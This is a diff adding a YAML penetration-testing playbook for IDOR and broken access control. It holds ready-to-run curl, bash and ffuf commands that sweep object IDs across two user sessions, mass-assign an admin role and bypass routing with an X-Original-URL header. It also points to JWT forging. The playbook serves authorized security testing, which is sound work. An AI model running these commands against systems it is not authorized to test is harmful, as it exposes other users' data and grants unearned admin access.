@@ -1,0 +1,46 @@
+id: web_idor
+title: "IDOR / broken object level authorization"
+phase: web
+mitre: ["T1190", "T1566"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: []
+  cves: []
+keywords:
+  - "idor"
+  - "broken access control"
+  - "object reference"
+  - "horizontal privesc"
+  - "vertical privesc"
+  - "authz bypass"
+preconditions:
+  - "Authenticated session with at least 2 user accounts (low + low) — or 1 low + 1 admin"
+  - "App exposes numeric / UUID identifiers in URLs / bodies / cookies"
+steps:
+  - tool: curl
+    cmd:  "curl -s -c cookies-A.txt -d 'username=userA&password=...' {base_url}/login && curl -s -c cookies-B.txt -d 'username=userB&password=...' {base_url}/login"
+    why:  "Capture two parallel sessions for cross-account testing"
+  - tool: bash
+    cmd:  "for ID in $(seq 1 50); do echo -n \"$ID: \"; curl -s -b cookies-A.txt {base_url}/api/orders/$ID | head -c 80; echo; done"
+    why:  "Sweep predictable ids — userA should only see their own orders"
+  - tool: ffuf
+    cmd:  "ffuf -u {base_url}/api/users/FUZZ -b 'session=userA_token' -w /usr/share/seclists/Fuzzing/numbers.txt -mc 200,201"
+    why:  "Same primitive at scale — log mismatched 200s"
+  - tool: burp
+    cmd:  "Use Autorize plugin: load userA and userB tokens, replay every request with the OTHER token; flag responses where length / status differs from baseline"
+    why:  "Industry standard — finds horizontal+vertical IDOR in one pass"
+  - tool: curl
+    cmd:  "curl -s -X PUT -b cookies-A.txt -H 'Content-Type: application/json' -d '{{\"role\":\"admin\"}}' {base_url}/api/users/me"
+    why:  "Mass-assignment IDOR — overwrite role/owner_id when API blindly accepts JSON keys"
+  - tool: curl
+    cmd:  "curl -s -b cookies-A.txt {base_url}/api/admin/users -H 'X-Original-URL: /api/admin/users'"
+    why:  "Header-trust bypass — many WAFs/proxies route on X-Original-URL / X-Rewrite-URL"
+expected_outcome: "Read/modify/delete data belonging to another tenant — escalate to admin role if mass-assignment lands"
+fallbacks:
+  - "If session uses signed JWT containing user_id → see auth_jwt_alg_none playbook for forging"
+  - "If only UUIDs visible → check predictable-uuid endpoints (user_id leaked in HTML, redirects, websockets)"
+  - "Audit GraphQL: query/mutation bypass with __schema introspection enabled"
+references:
+  - "https://owasp.org/www-project-api-security/"
+  - "https://book.hacktricks.xyz/pentesting-web/idor"
